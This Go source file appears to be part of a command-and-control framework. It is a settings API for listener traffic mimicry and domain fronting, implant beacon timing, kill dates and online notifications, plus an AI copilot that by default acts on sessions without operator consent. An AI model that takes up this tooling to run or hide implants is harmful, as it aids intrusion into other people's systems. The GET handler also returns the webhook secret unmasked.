package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"toshell/internal/server/auth"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
	"toshell/internal/server/mimicry"
	"toshell/internal/server/webhook"
)

// SettingsResponse 设置页 GET 返回的分组配置（敏感字段不返回）。
type SettingsResponse struct {
	General       map[string]interface{} `json:"general"`
	Listener      map[string]interface{} `json:"listener"`
	Implant       map[string]interface{} `json:"implant"`
	Notifications map[string]interface{} `json:"notifications"`
	Security      map[string]interface{} `json:"security"`
	AI            map[string]interface{} `json:"ai"`
}

// SettingsUpdate 设置页 PUT 请求体（均为可选，缺省不修改）。
type SettingsUpdate struct {
	Listener      *settingsListenerUpdate `json:"listener"`
	Implant       *settingsImplantUpdate  `json:"implant"`
	Notifications *settingsWebhookUpdate  `json:"notifications"`
	Security      *settingsSecurityUpdate `json:"security"`
	AI            *settingsAIUpdate       `json:"ai"`
}

type settingsAIUpdate struct {
	Enabled     *bool   `json:"enabled"`
	BaseURL     *string `json:"base_url"`
	APIKey      *string `json:"api_key"`
	Model       *string `json:"model"`
	Timeout     *int    `json:"timeout"`
	MaxTurns    *int    `json:"max_turns"`
	ConsentMode *string `json:"consent_mode"` // auto=全自动(默认) / normal=影响会话操作需用户同意(任务流除外)
}

type settingsListenerUpdate struct {
	Enabled        *bool   `json:"enabled"`
	Host           *string `json:"host"`
	Port           *uint16 `json:"port"`
	PublicHost     *string `json:"public_host"`
	Protocol       *string `json:"protocol"`
	TLSEnabled     *bool   `json:"tls_enabled"`
	MimicryProfile *string `json:"mimicry_profile"`
	FrontDomain    *string `json:"front_domain"`
	MimicrySite    *string `json:"mimicry_site"`
}

type settingsImplantUpdate struct {
	Interval        *uint32 `json:"interval"`
	Jitter          *uint32 `json:"jitter"`
	RetryWait       *uint32 `json:"retry_wait"`
	KillDate        *string `json:"kill_date"`
	WorkingHours    *string `json:"working_hours"`
	StartupDelayMin *int    `json:"startup_delay_min"`
	StartupDelayMax *int    `json:"startup_delay_max"`
}

type settingsWebhookUpdate struct {
	Enabled    *bool   `json:"enabled"`
	URL        *string `json:"url"`
	Content    *string `json:"content"`
	OnlyOnline *bool   `json:"only_online"`
	Format     *string `json:"format"` // auto / dingtalk / generic
	Secret     *string `json:"secret"` // 钉钉加签密钥（可选）
}

type settingsSecurityUpdate struct {
	AdminUsername *string `json:"admin_username"`
	NewPassword   *string `json:"new_password"` // 明文新密码，保存时 bcrypt 哈希
}

// getSettingsHandler 返回当前配置（分组、脱敏），供设置页面加载。
func (s *Server) getSettingsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	cfg := config.Get()
	if cfg == nil {
		http.Error(w, `{"error":"config not loaded"}`, http.StatusInternalServerError)
		return
	}

	resp := SettingsResponse{
		General: map[string]interface{}{
			"api_host":       cfg.Server.APIHost,
			"api_port":       cfg.Server.APIPort,
			"log_level":      cfg.Logging.Level,
			"log_format":     cfg.Logging.Format,
			"heartbeat_timeout": cfg.Listener.HeartbeatTimeout.String(),
			"write_queue_size":  cfg.Listener.WriteQueueSize,
		},
		Listener: map[string]interface{}{
			"enabled":         cfg.Listener.Enabled,
			"host":            cfg.Listener.Host,
			"port":            cfg.Listener.Port,
			"public_host":     cfg.Listener.PublicHost,
			"protocol":        cfg.Listener.Protocol,
			"tls_enabled":     cfg.Listener.TLSEnabled,
			"mimicry_profile": cfg.Listener.MimicryProfile,
			"front_domain":    cfg.Listener.FrontDomain,
			"mimicry_site":    cfg.Listener.MimicrySite,
		},
		Implant: map[string]interface{}{
			"interval":      cfg.Implant.Interval,
			"jitter":        cfg.Implant.Jitter,
			"retry_wait":    cfg.Implant.RetryWait,
			"kill_date":     cfg.Implant.KillDate,
			"working_hours": cfg.Implant.WorkingHours,
		},
		Notifications: map[string]interface{}{
			"enabled":     cfg.Webhook.Enabled,
			"url":         cfg.Webhook.URL,
			"content":     cfg.Webhook.Content,
			"only_online": cfg.Webhook.OnlyOnline,
			"format":      cfg.Webhook.Format,
			"secret":      cfg.Webhook.Secret,
		},
		Security: map[string]interface{}{
			"auth_enabled":    cfg.Auth.Enabled,
			"jwt_enabled":     cfg.Auth.JWTEnabled,
			"api_key_enabled": cfg.Auth.APIKeyEnabled,
			"admin_username":  cfg.Auth.AdminUsername,
		},
		AI: map[string]interface{}{
			"enabled":   cfg.AI.Enabled,
			"base_url":  cfg.AI.BaseURL,
			"api_key":   maskSecret(cfg.AI.APIKey),
			"model":     cfg.AI.Model,
			"timeout":   cfg.AI.Timeout,
			"max_turns": cfg.AI.MaxTurns,
		},
	}
	json.NewEncoder(w).Encode(resp)
}

// maskSecret 脱敏展示密钥类配置（保留首尾各 4 字符，其余掩码）。
func maskSecret(s string) string {
	if len(s) <= 8 {
		return "********"
	}
	return s[:4] + "****" + s[len(s)-4:]
}

// updateSettingsHandler 保存设置：校验 → 写回配置文件 → 热生效。
// 返回 hot=true 表示无需重启即已生效（webhook/拟态/认证/植入默认参数）。
func (s *Server) updateSettingsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	var upd SettingsUpdate
	if err := json.NewDecoder(r.Body).Decode(&upd); err != nil {
		http.Error(w, `{"error":"invalid request body"}`, http.StatusBadRequest)
		return
	}

	updates := map[string]interface{}{}
	hot := true

	// ── listener 段 ──
	if l := upd.Listener; l != nil {
		if l.Enabled != nil {
			updates["listener.enabled"] = *l.Enabled
		}
		if l.Host != nil {
			updates["listener.host"] = *l.Host
		}
		if l.Port != nil {
			if *l.Port == 0 {
				http.Error(w, `{"error":"listener.port 非法"}`, http.StatusBadRequest)
				return
			}
			updates["listener.port"] = *l.Port
			hot = false // 端口/绑定变化需重启 listener
		}
		if l.PublicHost != nil {
			updates["listener.public_host"] = *l.PublicHost
		}
		if l.Protocol != nil {
			updates["listener.protocol"] = *l.Protocol
			hot = false
		}
		if l.TLSEnabled != nil {
			updates["listener.tls_enabled"] = *l.TLSEnabled
			hot = false // TLS 开关需重启 listener
		}
		if l.MimicryProfile != nil {
			name := *l.MimicryProfile
			if name != "" && !contains(mimicry.Names(), name) {
				http.Error(w, fmt.Sprintf(`{"error":"未知拟态模板: %s"}`, name), http.StatusBadRequest)
				return
			}
			updates["listener.mimicry_profile"] = name
		}
		if l.FrontDomain != nil {
			fd := *l.FrontDomain
			if fd != "" {
				u, err := url.Parse("https://" + fd)
				if err != nil || u.Hostname() == "" {
					http.Error(w, `{"error":"front_domain 非法（示例: cdn.example.com）"}`, http.StatusBadRequest)
					return
				}
			}
			updates["listener.front_domain"] = fd
		}
		if l.MimicrySite != nil {
			site := *l.MimicrySite
			if site != "" {
				u, err := url.Parse(site)
				if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
					http.Error(w, `{"error":"mimicry_site 非法（示例: https://www.example.com）"}`, http.StatusBadRequest)
					return
				}
			}
			updates["listener.mimicry_site"] = site
		}
	}

	// ── implant 默认参数段 ──
	if im := upd.Implant; im != nil {
		if im.Interval != nil {
			updates["implant.interval"] = *im.Interval
		}
		if im.Jitter != nil {
			if *im.Jitter > 100 {
				http.Error(w, `{"error":"jitter 必须为 0-100"}`, http.StatusBadRequest)
				return
			}
			updates["implant.jitter"] = *im.Jitter
		}
		if im.RetryWait != nil {
			updates["implant.retry_wait"] = *im.RetryWait
		}
		if im.KillDate != nil {
			updates["implant.kill_date"] = *im.KillDate
		}
		if im.WorkingHours != nil {
			updates["implant.working_hours"] = *im.WorkingHours
		}
		if im.StartupDelayMin != nil {
			if *im.StartupDelayMin < 0 {
				http.Error(w, `{"error":"startup_delay_min 不能为负"}`, http.StatusBadRequest)
				return
			}
			updates["implant.startup_delay_min"] = *im.StartupDelayMin
		}
		if im.StartupDelayMax != nil {
			if *im.StartupDelayMax < 0 {
				http.Error(w, `{"error":"startup_delay_max 不能为负"}`, http.StatusBadRequest)
				return
			}
			updates["implant.startup_delay_max"] = *im.StartupDelayMax
		}
	}

	// ── 通知（webhook）段 ──
	if n := upd.Notifications; n != nil {
		if n.Enabled != nil {
			updates["webhook.enabled"] = *n.Enabled
		}
		if n.URL != nil {
			if *n.URL != "" {
				u, err := url.Parse(*n.URL)
				if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
					http.Error(w, `{"error":"webhook url 非法"}`, http.StatusBadRequest)
					return
				}
			}
			updates["webhook.url"] = *n.URL
		}
		if n.Content != nil {
			updates["webhook.content"] = *n.Content
		}
		if n.OnlyOnline != nil {
			updates["webhook.only_online"] = *n.OnlyOnline
		}
		if n.Format != nil {
			f := strings.ToLower(strings.TrimSpace(*n.Format))
			if f != "" && f != "auto" && f != "dingtalk" && f != "generic" {
				http.Error(w, `{"error":"format 仅支持 auto/dingtalk/generic"}`, http.StatusBadRequest)
				return
			}
			updates["webhook.format"] = f
		}
		if n.Secret != nil {
			updates["webhook.secret"] = *n.Secret
		}
	}

	// ── 安全（账户）段 ──
	if sec := upd.Security; sec != nil {
		if sec.AdminUsername != nil && *sec.AdminUsername != "" {
			updates["auth.admin_username"] = *sec.AdminUsername
		}
		if sec.NewPassword != nil && *sec.NewPassword != "" {
			if len(*sec.NewPassword) < 8 {
				http.Error(w, `{"error":"新密码至少 8 位"}`, http.StatusBadRequest)
				return
			}
			hashed, err := auth.HashPassword(*sec.NewPassword)
			if err != nil {
				http.Error(w, `{"error":"密码哈希失败"}`, http.StatusInternalServerError)
				return
			}
			updates["auth.admin_password"] = hashed
		}
	}

	// ── AI 副驾驶段 ──
	if a := upd.AI; a != nil {
		if a.Enabled != nil {
			updates["ai.enabled"] = *a.Enabled
		}
		if a.BaseURL != nil {
			b := strings.TrimSpace(*a.BaseURL)
			if b != "" && !strings.HasPrefix(b, "http://") && !strings.HasPrefix(b, "https://") {
				http.Error(w, `{"error":"ai.base_url 需以 http(s):// 开头"}`, http.StatusBadRequest)
				return
			}
			updates["ai.base_url"] = b
		}
		if a.APIKey != nil {
			k := strings.TrimSpace(*a.APIKey)
			// 掩码值（sk-****abcd）原样返回时不覆盖已有密钥
			if k != "" && !strings.Contains(k, "****") {
				updates["ai.api_key"] = k
			}
		}
		if a.Model != nil && strings.TrimSpace(*a.Model) != "" {
			updates["ai.model"] = strings.TrimSpace(*a.Model)
		}
		if a.Timeout != nil && *a.Timeout > 0 {
			updates["ai.timeout"] = *a.Timeout
		}
		if a.MaxTurns != nil && *a.MaxTurns > 0 {
			updates["ai.max_turns"] = *a.MaxTurns
		}
		if a.ConsentMode != nil {
			cm := strings.TrimSpace(*a.ConsentMode)
			if cm != "auto" && cm != "normal" {
				http.Error(w, `{"error":"ai.consent_mode 仅支持 auto / normal"}`, http.StatusBadRequest)
				return
			}
			updates["ai.consent_mode"] = cm
		}
	}

	if len(updates) == 0 {
		http.Error(w, `{"error":"没有可保存的配置项"}`, http.StatusBadRequest)
		return
	}

	if err := config.Save(updates); err != nil {
		logging.Error("settings", "save config failed: %v", err)
		http.Error(w, fmt.Sprintf(`{"error":"保存配置失败: %v"}`, err), http.StatusInternalServerError)
		return
	}

	// 热应用：认证配置立即替换（新密码/用户名即刻生效）
	cfg := config.Get()
	if cfg != nil {
		s.auth.Update(&cfg.Auth)
	}

	// 通知服务器主循环（listener 拟态等组件热更新）
	if s.onConfigApplied != nil {
		s.onConfigApplied(cfg)
	}

	logging.Info("settings", "settings saved (hot=%v, %d keys)", hot, len(updates))
	json.NewEncoder(w).Encode(map[string]interface{}{
		"message": "设置已保存",
		"hot":     hot,
	})
}

func contains(list []string, v string) bool {
	for _, x := range list {
		if x == v {
			return true
		}
	}
	return false
}

// testWebhookHandler 立即发送一条测试通知到指定 webhook（设置页"发送测试"）。
// 请求体：{url, content, format, secret}（secret 为钉钉加签密钥，可选）。
func (s *Server) testWebhookHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	var req struct {
		URL     string `json:"url"`
		Content string `json:"content"`
		Format  string `json:"format"`
		Secret  string `json:"secret"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.URL == "" {
		http.Error(w, `{"error":"url 必填"}`, http.StatusBadRequest)
		return
	}
	if !strings.HasPrefix(req.URL, "http://") && !strings.HasPrefix(req.URL, "https://") {
		http.Error(w, `{"error":"url 非法"}`, http.StatusBadRequest)
		return
	}

	status, respBody, err := webhook.SendTest(req.URL, req.Content, req.Format, req.Secret)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"发送失败: %v"}`, err), http.StatusBadGateway)
		return
	}
	ok := status < 300
	// 钉钉业务错误（HTTP 200 但 errcode 非 0）
	if strings.Contains(respBody, `"errcode"`) && !strings.Contains(respBody, `"errcode":0`) {
		ok = false
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":          ok,
		"status_code": status,
		"response":    truncateStr(respBody, 300),
	})
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
